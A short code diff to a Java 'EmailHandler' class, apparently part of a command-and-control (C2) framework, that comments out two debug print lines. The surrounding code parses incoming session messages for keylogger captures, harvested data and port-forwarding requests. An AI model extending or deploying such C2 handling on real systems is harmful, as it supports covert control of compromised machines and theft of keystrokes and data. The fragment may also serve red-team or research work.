@@ -151,7 +151,7 @@ public class EmailHandler extends C2Interface {
 				String harvestType = null;
 				boolean isPortForward = false;
 				String forwardAddress = null;
-				System.out.println("Processing email: " + sessionElements);
+				//System.out.println("Processing email: " + sessionElements);
 				if (sessionElements.startsWith(KEYLOGGER_PREFIX)) {
 					sessionElements = sessionElements.replace(KEYLOGGER_PREFIX, "");
 					isKeylogger = true;
@@ -165,7 +165,7 @@ public class EmailHandler extends C2Interface {
 					sessionElements = sessionElements.substring(firstSpaceIdx + 1);
 					isHarvest = true;
 				} else if(sessionElements.startsWith(PORT_FORWARD_PREFIX)) {
-					System.out.println("Its a forward");
+					//System.out.println("Its a forward");
 					sessionElements = sessionElements.replace(PORT_FORWARD_PREFIX, "");
 					int firstSpaceIdx = sessionElements.indexOf(" ");
 					forwardAddress = sessionElements.substring(0, firstSpaceIdx);
